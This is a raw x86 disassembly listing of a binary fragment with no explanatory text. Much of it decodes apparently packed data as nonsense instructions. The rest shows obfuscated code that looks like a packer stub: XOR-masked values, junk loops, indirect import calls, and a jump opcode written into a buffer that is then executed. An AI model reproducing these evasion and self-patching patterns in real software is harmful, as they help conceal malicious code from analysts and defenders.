  40996c:	sub    eax,0xb64d29a9
  409971:	(bad)  
  409972:	aad    0x65
  409974:	aam    0xed
  409976:	daa    
  409977:	repz ret 0x3525
  40997b:	in     al,dx
  40997c:	jp     0x409921
  40997e:	(bad)  
  40997f:	xor    al,0x69
  409981:	dec    eax
  409982:	fld    DWORD PTR [ebx-0x7]
  409985:	push   0x19
  409987:	or     al,0x7c
  409989:	xor    ah,dl
  40998b:	mov    ds,WORD PTR [ecx-0xbc249f1]
  409991:	mov    ebp,0x5a7354fd
  409996:	pusha  
  409997:	popf   
  409998:	or     eax,DWORD PTR [ecx-0x2a]
  40999b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40999c:	rcr    DWORD PTR [ebp+0x12],1
  40999f:	loopne 0x4099c9
  4099a1:	sub    BYTE PTR [esi-0x74],dh
  4099a4:	in     al,dx
  4099a5:	mov    cl,0xec
  4099a7:	adc    BYTE PTR [eax+0x4e],0x9c
  4099ab:	mov    bl,0xed
  4099ad:	shr    DWORD PTR [esp+esi*1],1
  4099b0:	(bad)  
  4099b1:	jns    0x409a31
  4099b3:	scas   al,BYTE PTR es:[edi]
  4099b4:	aad    0x53
  4099b6:	fistp  QWORD PTR [esi+0x29]
  4099b9:	les    ebp,FWORD PTR [esi-0x76]
  4099bc:	jge    0x4099d9
  4099be:	or     BYTE PTR [ebp-0x3f],dl
  4099c1:	call   0x6bb9fa42
  4099c6:	cmp    al,BYTE PTR [edi]
  4099c8:	std    
  4099c9:	pop    ss
  4099ca:	icebp  
  4099cb:	ds push esi
  4099cd:	inc    esp
  4099ce:	(bad)  
  4099cf:	push   esi
  4099d0:	adc    al,0xb0
  4099d2:	cdq    
  4099d3:	jmp    0xb0ea:0x38d071f
  4099da:	push   es
  4099db:	aas    
  4099dc:	add    DWORD PTR [ebx],edx
  4099de:	retf   0xd2a5
  4099e1:	or     eax,DWORD PTR ds:0xeee493c6
  4099e7:	stc    
  4099e8:	xor    BYTE PTR [esi+0x6e5162c1],al
  4099ee:	stos   DWORD PTR es:[edi],eax
  4099ef:	(bad)  
  4099f1:	mov    ebp,ebp
  4099f3:	cmp    al,0xf2
  4099f5:	cld    
  4099f6:	mov    eax,0x1338bef6
  4099fb:	and    DWORD PTR [ecx],ecx
  4099fd:	hlt    
  4099fe:	mov    ebp,0xe59531f0
  409a03:	or     eax,0xb3e6e02
  409a08:	call   0x99fa:0xa701d60b
  409a0f:	inc    ebx
  409a10:	sbb    al,0x3a
  409a12:	inc    esi
  409a13:	sub    eax,0x9fce2f29
  409a18:	or     al,0x84
  409a1a:	int3   
  409a1b:	add    DWORD PTR [esi],esi
  409a1d:	pop    esp
  409a1e:	nop
  409a1f:	jns    0x409a2a
  409a21:	inc    ebx
  409a22:	rcr    DWORD PTR [edi+eiz*4-0x5a32a06a],cl
  409a29:	hlt    
  409a2a:	cmp    DWORD PTR [ebp+0x4435c90],0xfc3e6076
  409a34:	test   DWORD PTR [edi-0x70afae13],0x99e7107f
  409a3e:	inc    ecx
  409a3f:	iret   
  409a40:	mov    esp,DWORD PTR [edx-0x5d8c461d]
  409a46:	repz data16 xor al,0x7c
  409a4a:	sbb    esp,edi
  409a4c:	push   cs
  409a4d:	out    0x3,eax
  409a4f:	sbb    BYTE PTR [ecx+0x159a5705],ah
  409a55:	aaa    
  409a56:	(bad)  
  409a57:	(bad)  
  409a58:	in     al,dx
  409a59:	in     al,dx
  409a5a:	lods   al,BYTE PTR ds:[esi]
  409a5b:	mov    DWORD PTR [eax],edx
  409a5d:	cmp    cl,BYTE PTR [edx-0x18839e2e]
  409a63:	mul    bh
  409a65:	sar    BYTE PTR [eax],1
  409a67:	pop    ebp
  409a68:	ret    0xd63b
  409a6b:	sahf   
  409a6c:	jl     0x409a1f
  409a6e:	in     al,0xb6
  409a70:	or     al,0x5
  409a72:	lahf   
  409a73:	add    al,0xa9
  409a75:	mov    ecx,0x77f030a0
  409a7a:	pop    ss
  409a7b:	mov    edi,DWORD PTR [edx]
  409a7d:	out    0x89,al
  409a7f:	stos   DWORD PTR es:[edi],eax
  409a80:	cmp    eax,0x1cb87337
  409a85:	mov    ah,0x9d
  409a87:	jecxz  0x409a7e
  409a89:	mov    ch,0xf8
  409a8b:	(bad)  
  409a8c:	hlt    
  409a8d:	inc    ecx
  409a8e:	jbe    0x409aaa
  409a90:	fisub  DWORD PTR [ecx+0x32]
  409a93:	add    al,0x74
  409a95:	in     al,dx
  409a96:	fild   DWORD PTR [edi+0x7c546144]
  409a9c:	push   ebp
  409a9d:	pop    es
  409a9e:	jmp    0x409ae6
  409aa0:	rcr    BYTE PTR [ebx-0x4d],cl
  409aa3:	in     al,0xc6
  409aa5:	dec    ebp
  409aa6:	inc    eax
  409aa7:	cmp    eax,0xd4aea7e
  409aac:	add    DWORD PTR [edi+0x4f],edi
  409aaf:	ror    bh,cl
  409ab1:	pop    es
  409ab2:	pop    ecx
  409ab3:	add    esp,esp
  409ab5:	jmp    0x409aa4
  409ab7:	iret   
  409ab8:	ins    DWORD PTR es:[edi],dx
  409ab9:	mov    ebx,0x6a8d930f
  409abe:	daa    
  409abf:	fwait
  409ac0:	inc    esi
  409ac1:	sbb    cl,BYTE PTR ds:0xb17f342e
  409ac7:	push   ecx
  409ac8:	sar    edx,cl
  409aca:	scas   eax,DWORD PTR es:[edi]
  409acb:	xlat   BYTE PTR ds:[ebx]
  409acc:	adc    eax,0xeb9b55d7
  409ad1:	(bad)  
  409ad2:	cmp    ah,BYTE PTR ds:0x4af7f6a0
  409ad8:	mov    ebx,DWORD PTR [eax]
  409ada:	bnd je 0x409b42
  409add:	fcmovnb st,st(6)
  409adf:	and    ebp,DWORD PTR [ebx+edx*2+0x55cf7349]
  409ae6:	(bad)  
  409ae7:	idiv   edi
  409ae9:	adc    BYTE PTR [eax-0xd4f45f8],dl
  409aef:	sub    eax,edx
  409af1:	and    eax,0xad20e852
  409af6:	call   0xcd36:0x63cff3cd
  409afd:	pushf  
  409afe:	xor    BYTE PTR [esi-0x2d93d589],ah
  409b04:	sub    BYTE PTR [esi+0x49d5ae2a],dl
  409b0a:	xchg   ebp,eax
  409b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b0c:	div    bl
  409b0e:	fist   DWORD PTR [ebp*4+0x1d40b2bf]
  409b15:	mov    BYTE PTR [edi+ebp*4+0x5614b197],0x62
  409b1d:	xor    DWORD PTR [edi],0xffffffe5
  409b20:	inc    ebp
  409b21:	xchg   ebp,eax
  409b22:	ret    0x1c04
  409b25:	pusha  
  409b26:	push   0xec94eb6c
  409b2b:	daa    
  409b2c:	pop    ecx
  409b2d:	mov    dl,dl
  409b2f:	scas   al,BYTE PTR es:[edi]
  409b30:	aad    0xb9
  409b32:	inc    esp
  409b33:	hlt    
  409b34:	adc    DWORD PTR [edx],ebx
  409b36:	xchg   ebp,eax
  409b37:	jmp    0x4044:0xa2d4a3bc
  409b3e:	xchg   ebp,eax
  409b3f:	mov    ds:0x1d76732d,eax
  409b44:	call   0x4829:0xdf1dbf53
  409b4b:	ret    0x56c5
  409b4e:	ins    BYTE PTR es:[edi],dx
  409b4f:	out    0xef,eax
  409b51:	sub    eax,DWORD PTR [edx+0x40]
  409b54:	hlt    
  409b55:	pop    esi
  409b56:	imul   ebp,DWORD PTR [edi+0x3c9c58de],0x44
  409b5d:	leave  
  409b5e:	push   eax
  409b5f:	adc    eax,0x6fa3e1cb
  409b64:	ficomp DWORD PTR [ecx+0x68]
  409b67:	lea    esp,[eax+0x5e]
  409b6a:	mov    ah,0xaa
  409b6c:	lods   eax,DWORD PTR ds:[esi]
  409b6d:	sub    BYTE PTR [edi-0x544117ce],cl
  409b73:	imul   eax,esp,0x71
  409b76:	pop    esp
  409b77:	mov    ds:0xde677588,eax
  409b7c:	pop    edi
  409b7d:	and    cl,bl
  409b7f:	loopne 0x409b2b
  409b81:	(bad)  
  409b82:	jecxz  0x409be1
  409b84:	sub    BYTE PTR ds:0x31cbcc4c,al
  409b8a:	xor    al,0x3d
  409b8c:	out    dx,al
  409b8d:	dec    ecx
  409b8e:	inc    DWORD PTR [eax+0x28e28986]
  409b94:	sbb    DWORD PTR [edi],esp
  409b96:	inc    esp
  409b97:	xchg   ecx,eax
  409b98:	xchg   ebx,eax
  409b99:	push   esi
  409b9a:	stos   BYTE PTR es:[edi],al
  409b9b:	add    DWORD PTR [edx+0x50],0x71cfc4b3
  409ba2:	pusha  
  409ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ba4:	pop    es
  409ba5:	sub    edx,DWORD PTR [edx-0x475dfd59]
  409bab:	jg     0x409b35
  409bad:	in     eax,0xfb
  409baf:	arpl   WORD PTR [ecx-0x78774db3],si
  409bb5:	sub    al,cl
  409bb7:	(bad)  
  409bb8:	push   ss
  409bb9:	inc    eax
  409bba:	loope  0x409bc8
  409bbc:	jp     0x409bb3
  409bbe:	call   FWORD PTR [eax+0x2b5b00a9]
  409bc4:	dec    edi
  409bc5:	gs call 0xf306de35
  409bcb:	mov    ds:0xd7f0a472,al
  409bd0:	mov    DWORD PTR [edx-0x19],ebp
  409bd3:	call   0xd5bf:0xfca100ea
  409bda:	dec    esp
  409bdb:	jbe    0x409be4
  409bdd:	sub    DWORD PTR [ebp-0x6d],edx
  409be0:	loope  0x409c46
  409be2:	test   DWORD PTR [ebx-0x2419449a],0x4506aa67
  409bec:	inc    edx
  409bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bee:	fidiv  WORD PTR ds:0x289f6172
  409bf4:	fld    DWORD PTR [edx+esi*4-0x36]
  409bf8:	neg    DWORD PTR [ebx+0xf]
  409bfb:	dec    edx
  409bfc:	sub    eax,0xb42241fa
  409c01:	mov    ebx,0x5b49c0e1
  409c06:	sahf   
  409c07:	sub    eax,0x9c529d89
  409c0c:	call   0xac8b:0x9d5adb5f
  409c13:	dec    ecx
  409c14:	mov    ebx,0x4fb6674
  409c19:	push   esp
  409c1a:	in     al,0xea
  409c1c:	jg     0x409bc3
  409c1e:	inc    ebp
  409c1f:	sub    DWORD PTR [edi+0x4d],ebx
  409c22:	mov    edx,edx
  409c24:	push   edi
  409c25:	and    ah,dl
  409c27:	jnp    0x409c3e
  409c29:	xchg   esp,eax
  409c2a:	push   ebx
  409c2b:	jbe    0x409bf3
  409c2d:	out    0x29,al
  409c2f:	fisttp QWORD PTR [eax+0x1f6aebde]
  409c35:	and    esp,ebp
  409c37:	mov    eax,0xa47a467e
  409c3c:	xchg   BYTE PTR [eax+ebp*1-0x7f88fe07],cl
  409c43:	cmp    DWORD PTR [edx+eiz*1],0x91db3716
  409c4a:	shl    BYTE PTR [edi-0x21398142],cl
  409c50:	jg     0x409bf3
  409c52:	lahf   
  409c53:	pusha  
  409c54:	stos   DWORD PTR es:[edi],eax
  409c55:	out    dx,al
  409c56:	jge    0x409cb8
  409c58:	jo     0x409c25
  409c5a:	and    al,0xba
  409c5c:	hlt    
  409c5d:	mov    ebx,0xa6805c37
  409c62:	push   0x1699be14
  409c67:	shl    BYTE PTR [edi-0x53ea4a82],1
  409c6d:	addr16 pop edx
  409c6f:	add    BYTE PTR ds:0xc2835411,0x58
  409c76:	pop    ecx
  409c77:	jmp    DWORD PTR [edi]
  409c79:	shr    al,1
  409c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c7c:	and    eax,0x132ae3e3
  409c81:	adc    esi,eax
  409c83:	push   edx
  409c84:	pop    edi
  409c85:	push   ecx
  409c86:	ror    BYTE PTR [esi+0x6],1
  409c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c8a:	fs in  eax,dx
  409c8c:	cs push 0x713d83db
  409c92:	mov    ah,0xc2
  409c94:	and    eax,0x888e8db9
  409c99:	jle    0x409c91
  409c9b:	or     BYTE PTR [esi+0x7918b06f],cl
  409ca1:	inc    edi
  409ca2:	test   DWORD PTR [ebp-0x49bcb826],ebx
  409ca8:	fnstcw WORD PTR [eax]
  409caa:	pop    ebp
  409cab:	inc    ebx
  409cac:	out    0x59,al
  409cae:	gs into 
  409cb0:	push   0x7347fa1
  409cb5:	add    al,0x5a
  409cb7:	push   ecx
  409cb8:	mov    esp,0xd09c0471
  409cbd:	(bad)  
  409cbe:	loopne 0x409d07
  409cc0:	sbb    ebx,edi
  409cc2:	neg    BYTE PTR [edx]
  409cc4:	sti    
  409cc5:	ror    BYTE PTR [esi],1
  409cc7:	fs repnz popa 
  409cca:	xchg   edx,eax
  409ccb:	arpl   WORD PTR [eax-0x2ea012e1],bx
  409cd1:	push   eax
  409cd2:	inc    ebp
  409cd3:	sub    al,al
  409cd5:	in     al,0x4c
  409cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cd9:	test   DWORD PTR [ecx+0x49],0xc33f81af
  409ce0:	push   eax
  409ce1:	(bad)  
  409ce2:	jmp    eax
  409ce4:	(bad)  ds:0xa39f167e
  409cea:	les    ebp,FWORD PTR [edi-0x51644de3]
  409cf0:	or     al,0x8d
  409cf2:	lods   al,BYTE PTR ds:[esi]
  409cf3:	push   esi
  409cf4:	aaa    
  409cf5:	sar    BYTE PTR [ecx+0x2e],0xe8
  409cf9:	xchg   ebp,eax
  409cfa:	(bad)  
  409cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cfc:	lahf   
  409cfd:	nop
  409cfe:	pushf  
  409cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d00:	jmp    0xdf41:0x6e4abcc1
  409d07:	add    ecx,edx
  409d09:	mov    ah,0xd6
  409d0b:	dec    edx
  409d0c:	sub    dl,BYTE PTR [esi-0x22]
  409d0f:	aad    0x4e
  409d11:	jnp    0x409ca5
  409d13:	xlat   BYTE PTR ds:[ebx]
  409d14:	mov    esi,0x2a68fa16
  409d19:	les    ecx,FWORD PTR [ebx-0x5e8eca8c]
  409d1f:	retf   
  409d20:	in     al,0x95
  409d22:	sub    cl,0x85
  409d25:	test   eax,0xffdff064
  409d2a:	and    esp,edi
  409d2c:	push   ebp
  409d2d:	cld    
  409d2e:	xor    BYTE PTR [ebx+0x38649b36],cl
  409d34:	stc    
  409d35:	sbb    esi,edi
  409d37:	out    dx,eax
  409d38:	adc    al,BYTE PTR [eax-0x701949d]
  409d3e:	xor    al,0xdb
  409d40:	lock bound eax,QWORD PTR [ebp-0x7b513f9a]
  409d47:	and    BYTE PTR [ebx+0x8],0xbb
  409d4b:	add    DWORD PTR [eax],ebp
  409d4d:	push   0xffffffbf
  409d4f:	and    DWORD PTR [ebp-0x4c],ebx
  409d52:	leave  
  409d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d54:	rol    BYTE PTR [edx],cl
  409d56:	imul   eax
  409d58:	or     esp,DWORD PTR [esi-0x9dc5b12]
  409d5e:	dec    esi
  409d5f:	popf   
  409d60:	stos   BYTE PTR es:[edi],al
  409d61:	out    0x24,al
  409d63:	div    ebx
  409d65:	push   esi
  409d66:	addps  xmm6,XMMWORD PTR [ecx+0x4c]
  409d6a:	cmp    al,0x9
  409d6c:	lahf   
  409d6d:	outs   dx,BYTE PTR ds:[esi]
  409d6e:	pop    esi
  409d6f:	fisubr DWORD PTR [ebx]
  409d71:	sbb    eax,0xda080c06
  409d76:	or     al,0x8a
  409d78:	mov    esi,0xc418f0bf
  409d7d:	je     0x409d6d
  409d7f:	fcmovne st,st(6)
  409d81:	(bad)  
  409d82:	into   
  409d83:	in     eax,0xc2
  409d85:	in     eax,dx
  409d86:	mov    esp,0x8d918ba7
  409d8b:	(bad)
  409d8f:	jmp    0xab2e968c
  409d94:	mov    DWORD PTR [ebx-0x1b],esp
  409d97:	and    esi,ebp
  409d99:	mov    esi,0x775d02ed
  409d9e:	mov    ch,0x5b
  409da0:	pop    es
  409da1:	mov    al,ds:0x6f9b0b42
  409da6:	sete   BYTE PTR [ebp-0x65a228d7]
  409dad:	jl     0x409d53
  409daf:	rcr    BYTE PTR [ebp+0x2d87aae8],cl
  409db5:	mov    ah,0xb1
  409db7:	mov    ?,eax
  409db9:	lahf   
  409dba:	sbb    edi,DWORD PTR [esi]
  409dbc:	js     0x409d7f
  409dbe:	and    dh,BYTE PTR [esi+0x77]
  409dc1:	pop    eax
  409dc2:	xor    esi,eax
  409dc4:	pop    esp
  409dc5:	test   esi,esp
  409dc7:	adc    al,0x7d
  409dc9:	scas   al,BYTE PTR es:[edi]
  409dca:	imul   bl
  409dcc:	popa   
  409dcd:	pop    ebx
  409dce:	test   al,0x3c
  409dd0:	jbe    0x409e2b
  409dd2:	and    bl,BYTE PTR [ebp-0x316ccfb]
  409dd8:	ss mov edi,0x7cea43fc
  409dde:	mov    WORD PTR [edi],gs
  409de0:	inc    ecx
  409de1:	xchg   edx,eax
  409de2:	cs iret 
  409de4:	sar    dh,1
  409de6:	adc    al,0xfd
  409de8:	sbb    BYTE PTR [ebp-0x362f43ab],ah
  409dee:	cwde   
  409def:	jne    0x409e1c
  409df1:	ror    DWORD PTR [ecx+0x4d81fc45],0xfc
  409df8:	mov    esp,0x8bf89c85
  409dfd:	inc    ebp
  409dfe:	hlt    
  409dff:	xor    eax,esi
  409e01:	add    eax,edi
  409e03:	push   eax
  409e04:	mov    eax,DWORD PTR [ebp-0x10]
  409e07:	xor    eax,esi
  409e09:	add    eax,edi
  409e0b:	push   eax
  409e0c:	mov    eax,DWORD PTR [ebp-0x4]
  409e0f:	xor    eax,esi
  409e11:	add    eax,edi
  409e13:	push   eax
  409e14:	lea    eax,[ebp-0x7c]
  409e17:	push   eax
  409e18:	push   DWORD PTR [ebp-0x2c]
  409e1b:	push   DWORD PTR [ebp-0x28]
  409e1e:	call   0x40c8dd
  409e23:	test   eax,eax
  409e25:	je     0x409e53
  409e2b:	lea    eax,[ebp-0x7c]
  409e2e:	push   eax
  409e2f:	mov    eax,DWORD PTR [ebp-0x28]
  409e32:	xor    eax,esi
  409e34:	add    eax,edi
  409e36:	push   eax
  409e37:	mov    eax,DWORD PTR [ebp-0x24]
  409e3a:	add    eax,0xaa
  409e3f:	push   eax
  409e40:	mov    eax,DWORD PTR [ebp-0x24]
  409e43:	mov    eax,DWORD PTR [eax+0x198]
  409e49:	push   DWORD PTR [eax]
  409e4b:	call   0x402992
  409e50:	mov    DWORD PTR [ebp-0x14],eax
  409e53:	lea    eax,[ebp+0x4]
  409e56:	mov    DWORD PTR [ebp-0x30],eax
  409e59:	mov    eax,DWORD PTR [ebp-0x14]
  409e5c:	test   eax,eax
  409e5e:	je     0x409ec6
  409e64:	lea    eax,[ebp-0x8]
  409e67:	mov    DWORD PTR [ebp-0x38],eax
  409e6a:	mov    eax,DWORD PTR [ebp-0x34]
  409e6d:	mov    DWORD PTR [ebp-0x8],eax
  409e70:	mov    eax,DWORD PTR [ebp-0x8]
  409e73:	mov    ecx,DWORD PTR [ebp-0x14]
  409e76:	sub    eax,ecx
  409e78:	mov    DWORD PTR [ebp-0x8],eax
  409e7b:	mov    ecx,DWORD PTR [ebp-0x4]
  409e7e:	xor    ecx,esi
  409e80:	mov    eax,0xffcd8d20
  409e85:	sub    eax,ecx
  409e87:	add    DWORD PTR [ebp-0x8],eax
  409e8a:	mov    eax,DWORD PTR [ebp-0x8]
  409e8d:	mov    ecx,DWORD PTR [ebp-0x14]
  409e90:	mov    DWORD PTR [ecx+0x1],eax
  409e93:	mov    eax,DWORD PTR [ebp-0x14]
  409e96:	push   DWORD PTR [ebp-0x24]
  409e99:	mov    BYTE PTR [eax],0xe9
  409e9c:	mov    eax,ds:0x42e18f
  409ea1:	push   DWORD PTR [eax]
  409ea3:	push   DWORD PTR ds:0x42e3eb
  409ea9:	push   DWORD PTR ds:0x42e197
  409eaf:	push   DWORD PTR ds:0x42e3cb
  409eb5:	push   DWORD PTR ds:0x42e6f3
  409ebb:	push   DWORD PTR [ebp-0x28]
  409ebe:	push   DWORD PTR [ebp-0x2c]
  409ec1:	mov    eax,DWORD PTR [ebp-0x14]
  409ec4:	call   eax
  409ec6:	mov    eax,DWORD PTR [ebp-0x30]
  409ec9:	mov    ecx,DWORD PTR ds:0x42e38f
  409ecf:	add    DWORD PTR [eax],ecx
  409ed1:	pop    edi
  409ed2:	pop    esi
  409ed3:	leave  
  409ed4:	ret    
  409ed5:	push   ebp
  409ed6:	mov    ebp,esp
  409ed8:	sub    esp,0x18
  409edb:	add    edx,DWORD PTR ds:0x42c004
  409ee1:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  409ee8:	xor    DWORD PTR ds:0x42d018,0x529f
  409ef2:	lea    eax,[ebp+0x14]
  409ef5:	sbb    ecx,edx
  409ef7:	mov    DWORD PTR [ebp-0x4],eax
  409efa:	add    DWORD PTR ds:0x429010,edx
  409f00:	push   esi
  409f01:	mov    DWORD PTR ds:0x429000,0x1b
  409f0b:	cmp    DWORD PTR ds:0x429000,0x0
  409f12:	je     0x409f77
  409f18:	cmp    DWORD PTR ds:0x429000,0xb
  409f1f:	jne    0x409f38
  409f25:	push   DWORD PTR [ebp-0x28]
  409f28:	push   0x0
  409f2a:	push   0x42d010
  409f2f:	push   DWORD PTR [ebp-0x1c]
  409f32:	call   DWORD PTR ds:0x42e9af
  409f38:	cmp    DWORD PTR ds:0x429000,0xc
  409f3f:	jne    0x409f54
  409f45:	xor    esi,esi
  409f47:	or     esi,DWORD PTR ds:0x429000
  409f4d:	dec    esi
  409f4e:	mov    DWORD PTR ds:0x429000,esi
  409f54:	mov    esi,DWORD PTR ds:0x429000
  409f5a:	dec    esi
  409f5b:	mov    DWORD PTR ds:0x429000,esi
  409f61:	jmp    0x409f0b
  409f66:	mov    ecx,DWORD PTR ds:0x41ac60
  409f6c:	mov    edx,DWORD PTR ds:0x41ac64
  409f72:	sub    ecx,edx
  409f74:	xor    ecx,DWORD PTR [ecx+edx*1]
  409f77:	mov    esi,0xf89c85b9
  409f7c:	xor    DWORD PTR ds:0x429028,edx
  409f82:	mov    DWORD PTR [ebp-0xc],esi
  409f85:	sub    DWORD PTR ds:0x42a014,edi
  409f8b:	lea    eax,[ebp-0xc]
  409f8e:	movzx  edx,BYTE PTR ds:0x42c014
  409f95:	adc    edx,DWORD PTR ds:0x42a004
  409f9b:	mov    DWORD PTR ds:0x42c014,edx
  409fa1:	mov    DWORD PTR [ebp-0x14],eax
  409fa4:	or     DWORD PTR ds:0x42d010,0xdad
  409fae:	mov    eax,DWORD PTR [ebp-0xc]
  409fb1:	and    DWORD PTR ds:0x429008,0x0
  409fbb:	jmp    0x409fcd
  409fc0:	mov    ecx,DWORD PTR ds:0x429008
  409fc6:	inc    ecx
  409fc7:	mov    DWORD PTR ds:0x429008,ecx
  409fcd:	cmp    DWORD PTR ds:0x429008,0x15
  409fd4:	jae    0x40a012
  409fda:	cmp    DWORD PTR ds:0x429008,0x9
  409fe1:	jne    0x409fed
  409fe7:	call   DWORD PTR ds:0x42e9b3
  409fed:	cmp    DWORD PTR ds:0x429008,0x8
  409ff4:	jne    0x40a007
  409ffa:	mov    ecx,DWORD PTR ds:0x429008
  40a000:	inc    ecx
  40a001:	mov    DWORD PTR ds:0x429008,ecx
  40a007:	jmp    0x409fc0
  40a00c:	sub    DWORD PTR ds:0x42901c,edx
  40a012:	mov    edx,DWORD PTR [ebp-0x14]
  40a015:	and    DWORD PTR ds:0x42b010,0x0
  40a01f:	jmp    0x40a031
  40a024:	mov    ecx,DWORD PTR ds:0x42b010
  40a02a:	inc    ecx
  40a02b:	mov    DWORD PTR ds:0x42b010,ecx
  40a031:	cmp    DWORD PTR ds:0x42b010,0x17
  40a038:	jae    0x40a06e
  40a03e:	cmp    DWORD PTR ds:0x42b010,0x19
  40a045:	jne    0x40a069
  40a04b:	push   DWORD PTR [ebp-0x10]
  40a04e:	push   0x429008
  40a053:	push   0x87b9
  40a058:	push   DWORD PTR [ebp-0x1c]
  40a05b:	push   DWORD PTR [ebp-0x24]
  40a05e:	push   0x8ec6
  40a063:	call   DWORD PTR ds:0x42e9b7
  40a069:	jmp    0x40a024
  40a06e:	mov    ecx,0x7510899
  40a073:	xor    eax,ecx
  40a075:	add    eax,0x3272e0
  40a07a:	mov    DWORD PTR [edx],eax
  40a07c:	mov    eax,ds:0x42e18b
  40a081:	add    DWORD PTR ds:0x429020,ebx
  40a087:	mov    edx,DWORD PTR [ebp-0x4]
  40a08a:	mov    eax,DWORD PTR [eax]
  40a08c:	add    DWORD PTR ds:0x42d010,0x42b008
  40a096:	add    eax,DWORD PTR [edx]
  40a098:	sbb    edx,DWORD PTR ds:0x42c00c
  40a09e:	push   edi
  40a09f:	mov    DWORD PTR [ebp-0x8],eax
  40a0a2:	and    DWORD PTR ds:0x42c014,0x0
  40a0ac:	jmp    0x40a0bf
  40a0b1:	xor    eax,eax
  40a0b3:	add    eax,DWORD PTR ds:0x42c014
  40a0b9:	inc    eax
  40a0ba:	mov    ds:0x42c014,eax
  40a0bf:	cmp    DWORD PTR ds:0x42c014,0x1d
  40a0c6:	jae    0x40a159
  40a0cc:	cmp    DWORD PTR ds:0x42c014,0x8
  40a0d3:	jne    0x40a0df
  40a0d9:	call   DWORD PTR ds:0x42e9bb
  40a0df:	cmp    DWORD PTR ds:0x42c014,0x7
  40a0e6:	jne    0x40a0fa
  40a0ec:	xor    eax,eax
  40a0ee:	xor    eax,DWORD PTR ds:0x42c014
  40a0f4:	inc    eax
  40a0f5:	mov    ds:0x42c014,eax
  40a0fa:	jmp    0x40a0b1
  40a0ff:	and    DWORD PTR ds:0x42d004,0x0
  40a109:	jmp    0x40a11c
  40a10e:	xor    eax,eax
  40a110:	or     eax,DWORD PTR ds:0x42d004
  40a116:	inc    eax
  40a117:	mov    ds:0x42d004,eax
  40a11c:	cmp    DWORD PTR ds:0x42d004,0x1c
  40a123:	jae    0x40a159
  40a129:	cmp    DWORD PTR ds:0x42d004,0x2b
  40a130:	jne    0x40a147
  40a136:	push   DWORD PTR [ebp-0x20]
  40a139:	push   0x429018
  40a13e:	push   DWORD PTR [ebp-0x1c]
  40a141:	call   DWORD PTR ds:0x42e9bf
  40a147:	jmp    0x40a10e
  40a14c:	movzx  edi,BYTE PTR ds:0x42c014
  40a153:	sbb    DWORD PTR ds:0x42a004,edi
  40a159:	mov    edi,DWORD PTR [ebp+0x8]
  40a15c:	adc    edx,edx
  40a15e:	mov    eax,ds:0x42e313
  40a163:	mov    eax,DWORD PTR [eax+0x198]
  40a169:	xor    edi,ecx
  40a16b:	mov    DWORD PTR ds:0x42a008,0x1f
  40a175:	cmp    DWORD PTR ds:0x42a008,0x0
  40a17c:	je     0x40a1b8
  40a182:	cmp    DWORD PTR ds:0x42a008,0x2d
  40a189:	jne    0x40a1a4
  40a18f:	push   0x42e000
  40a194:	push   0x42e139
  40a199:	push   0x400000
  40a19e:	call   DWORD PTR ds:0x42e9c7
  40a1a4:	xor    edx,edx
  40a1a6:	add    edx,DWORD PTR ds:0x42a008
  40a1ac:	dec    edx
  40a1ad:	mov    DWORD PTR ds:0x42a008,edx
  40a1b3:	jmp    0x40a175
  40a1b8:	mov    edx,0x3272e0
  40a1bd:	xor    DWORD PTR ds:0x429010,0x6770
  40a1c7:	add    edi,edx
  40a1c9:	cmp    DWORD PTR [eax],edi
  40a1cb:	mov    DWORD PTR ds:0x42900c,0x1dd7
  40a1d5:	je     0x40a1f6
  40a1db:	mov    DWORD PTR ds:0x429014,0x4354
  40a1e5:	mov    eax,DWORD PTR [eax]
  40a1e7:	mov    DWORD PTR ds:0x42900c,0x7b1e
  40a1f1:	jmp    0x40c789
  40a1f6:	mov    eax,ds:0x42a008
  40a1fb:	mov    eax,DWORD PTR [ebp+0x18]
  40a1fe:	cmp    eax,esi
  40a200:	jne    0x40a224
  40a206:	mov    DWORD PTR ds:0x429010,0x2813
  40a210:	push   0xf89c85b8
  40a215:	mov    DWORD PTR ds:0x429020,0x131a
  40a21f:	jmp    0x40c778
  40a224:	mov    esi,0x74b
  40a229:	mov    esi,DWORD PTR [ebp+0x18]
  40a22c:	mov    eax,0xf89c85bb
  40a231:	cmp    esi,eax
  40a233:	mov    DWORD PTR ds:0x42c010,0x1f83
  40a23d:	jne    0x40c768
  40a243:	add    esi,eax
  40a245:	mov    eax,DWORD PTR [ebp+0x10]
  40a248:	add    esi,0x4b50
  40a24e:	xor    eax,ecx
  40a250:	or     DWORD PTR ds:0x42c01c,edx
  40a256:	add    eax,edx
  40a258:	mov    DWORD PTR [ebp-0x18],eax
  40a25b:	sbb    DWORD PTR ds:0x42d01c,edx
  40a261:	mov    eax,DWORD PTR [ebp+0xc]
  40a264:	add    esi,0x5e8f
  40a26a:	mov    esi,DWORD PTR [ebp-0x8]
  40a26d:	xor    eax,ecx
  40a26f:	mov    DWORD PTR ds:0x42d004,0x61c0
  40a279:	add    eax,edx
  40a27b:	add    DWORD PTR ds:0x42a004,0x42d004
  40a285:	imul   eax,DWORD PTR [esi]
  40a288:	add    DWORD PTR ds:0x42d004,0x19e2
  40a292:	mov    esi,DWORD PTR [ebp+0x8]
  40a295:	xor    esi,ecx
  40a297:	add    esi,edx
  40a299:	cmp    esi,eax
  40a29b:	mov    eax,DWORD PTR [ebp-0x4]
  40a29e:	push   ebx
  40a29f:	je     0x40a2be
  40a2a5:	mov    esi,DWORD PTR [ebp-0x18]
  40a2a8:	add    DWORD PTR [eax],esi
  40a2aa:	mov    eax,DWORD PTR [ebp-0x4]
  40a2ad:	mov    esi,DWORD PTR [ebp+0xc]
  40a2b0:	xor    esi,ecx
  40a2b2:	add    esi,edx
  40a2b4:	imul   esi,DWORD PTR [eax]
  40a2b7:	mov    DWORD PTR [eax],esi
  40a2b9:	jmp    0x40a2c3
  40a2be:	mov    esi,DWORD PTR [ebp+0x14]
